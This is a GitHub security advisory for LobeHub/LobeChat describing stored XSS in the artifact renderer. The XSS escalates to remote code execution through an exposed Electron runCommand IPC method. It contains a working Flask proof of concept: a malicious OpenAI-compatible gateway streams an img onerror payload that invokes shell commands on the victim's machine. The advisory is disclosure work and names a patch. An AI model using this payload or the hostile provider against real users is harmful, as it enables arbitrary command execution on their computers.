# [M] LobeHub has a Cross-Site Scripting issue that escalates to Remote Code Execution

## Summary
Severity: Medium
Advisory: GHSA-xq4x-622m-q8fq
CVE: CVE-2026-42045
CWE: CWE-78, CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-xq4x-622m-q8fq
Type: github-advisory

## Affected
- npm: `@lobehub/lobehub` — affected >=0

## Details
### Summary
The vulnerability was automatically discovered by an ai agent and then manually verified.

LobeChat's message rendering mechanism has a stored cross-site scripting (XSS) vulnerability. Combined with the Electron main process's exposed insecure IPC interface, attackers can construct malicious payloads to achieve an attack chain from XSS to remote code execution (RCE).

The LobeChat team verified this vulnerability in lobehub v2.1.23, and it also exists in the latest version.

### Details
When LobeChat processes custom tags in the Render process of `src/features/Portal/Artifacts/Body/Renderer/index.tsx`, if no type match is found, it will choose to call the default method, HTMLRenderer, for HTML rendering.

```typescript
const Renderer = memo<{ content: string; type?: string }>(({ content, type }) => {
  switch (type) {
    case 'application/lobe.artifacts.react': {
      return <ReactRenderer code={content} />;
    }

    case 'image/svg+xml': {
      return <SVGRender content={content} />;
    }

    case 'application/lobe.artifacts.mermaid': {
      return <Mermaid variant={'borderless'}>{content}</Mermaid>;
    }

    case 'text/markdown': {
      return <Markdown style={{ overflow: 'auto' }}>{content}</Markdown>;
    }

    default: {
      return <HTMLRenderer htmlContent={content} />;
    }
  }
});

export default Renderer;
```

If an attacker can induce the LLM to output content containing malicious tags, an XSS vulnerability can be created on the client side.

Additionally, Lobechat's Electron main process exposes an IPC interface called `runCommand`, used to invoke system commands. This interface allows arbitrary command execution and does not filter the `command` parameter. Therefore, if an attacker can obtain a handle to `window.parent.electronAPI` via XSS and call the `runCommand` method of the IPC, the `ipcMain` process can execute arbitrary system commands with the current user's privileges.

```typescript
  @IpcMethod()
  async handleRunCommand({
    command,
    description,
    run_in_background,
    timeout = 120_000,
  }: RunCommandParams): Promise<RunCommandResult> {
    ...
    const childProcess = spawn(shellConfig.cmd, shellConfig.args, {
            env: process.env,
            shell: false,
          });
    ...
  }
```

### PoC
The attacker launched a malicious OpenAI gateway on port 5001

```python
from flask import Flask, Response, request, jsonify
import time
import json

app = Flask(__name__)
fake_api_key = "sk-test"

@app.route('/v1/chat/completions', methods=['POST', 'OPTIONS'])
def chat_completions():
    if request.method == 'OPTIONS':
        return Response(status=200, headers={
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Headers': '*'
        })

    # Check for API Key
    auth_header = request.headers.get('Authorization')
    print(auth_header)
    if not auth_header or auth_header != f'Bearer {fake_api_key}':
        return jsonify({"error": {"message": "Invalid API Key", "type": "invalid_request_error", "code": "invalid_api_key"}}), 401

    def generate(): 
        payload = """
<lobeArtifact type="nebula">
<img src=x onerror='window.parent.electronAPI.invoke("shellCommand.handleRunCommand", {command:"open -a Calculator"})'>
</lobeArtifact>
"""
        # Split payload into chunks to simulate streaming
        chunks = [payload[i:i+10] for i in range(0, len(payload), 10)]
        
        for chunk in chunks:
            data = {
                "id": "chatcmpl-hpdoger-123", 
                "object": "chat.completion.chunk", 
                "created": int(time.time()), 
                "model": "gpt-3.5-turbo", 
                "choices": [{
                    "index": 0, 
                    "delta": {"content": chunk},
                    "finish_reason": None
                }]
            }
            yield f"data: {json.dumps(data)}\n\n"
            time.sleep(0.1)
        
        # End of stream
        final_data = {
            "id": "chatcmpl-hpdoger-123", 
            "object": "chat.completion.chunk", 
            "created": int(time.time()), 
            "model": "gpt-3.5-turbo", 
            "choices": [{
                "index": 0, 
                "delta": {},
                "finish_reason": "stop"
            }]
        }
        yield f"data: {json.dumps(final_data)}\n\n"
        yield "data: [DONE]\n\n"

    return Response(generate(), mimetype='text/event-stream', headers={
        'Access-Control-Allow-Origin': '*', 
        'Access-Control-Allow-Headers': '*'
    })

@app.route('/v1/models', methods=['GET'])
def models():
    return jsonify({
        "object": "list", 
        "data": [{
            "id": "gpt-3.5-turbo", 
            "object": "model", 
            "created": 1677610602, 
            "owned_by": "openai"
        }]
    })

if __name__ == '__main__':
    print("Evil OpenAI-compatible server running on http://127.0.0.1:5001")
    app.run(port=5001, debug=True)
```

The victim opens the LobeChat application and configures an LLM Provider, entering the address of the HTTP server provided by the attacker.

<img width="2048" height="772" alt="image" src="https://github.com/user-attachments/assets/86fe8f76-d75f-4e23-a2c5-fe29b124c7a7" />

The victim was exposed to an arbitrary command execution vulnerability while chatting

<img width="2048" height="1036" alt="image" src="https://github.com/user-attachments/assets/0a84171f-ec78-4166-b7ab-298ece6b06b9" />

### reproduction
For attack reproduction, refer to this video. Once the victim configures the attacker's LLM provider endpoint, arbitrary commands can be executed. Here, our demonstration `opens a calculator` in the victim's environment.

https://github.com/user-attachments/assets/6383e996-9148-4e88-8e25-90260104368d

### Impact
Affected LobeChat clients can connect to the attacker's LLM endpoint and trigger arbitrary command execution simply by sending normal conversation messages.

### Patch
A patch is available at https://github.com/lobehub/lobehub/releases/tag/v2.1.48.

## References
- https://github.com/lobehub/lobehub/security/advisories/GHSA-xq4x-622m-q8fq
- https://nvd.nist.gov/vuln/detail/CVE-2026-42045
- https://github.com/lobehub/lobehub
